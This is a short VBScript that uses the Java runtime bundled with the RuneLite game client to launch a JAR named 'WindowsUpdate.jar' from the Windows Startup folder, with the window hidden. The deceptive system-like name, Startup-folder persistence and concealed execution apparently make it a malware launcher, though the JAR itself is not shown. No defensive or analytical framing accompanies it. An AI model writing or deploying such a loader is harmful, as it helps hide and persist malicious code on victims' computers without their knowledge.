Set objShell = CreateObject("WScript.Shell")
' Get the user home directory using the USERPROFILE environment variable
homeDir = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
' Construct paths
javaPath = homeDir & "\AppData\Local\RuneLite\jre\bin\java.exe"
jarPath = homeDir & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.jar"
' Run the Java application without opening a console window
objShell.Run """" & javaPath & """ -jar """ & jarPath & """", 0, False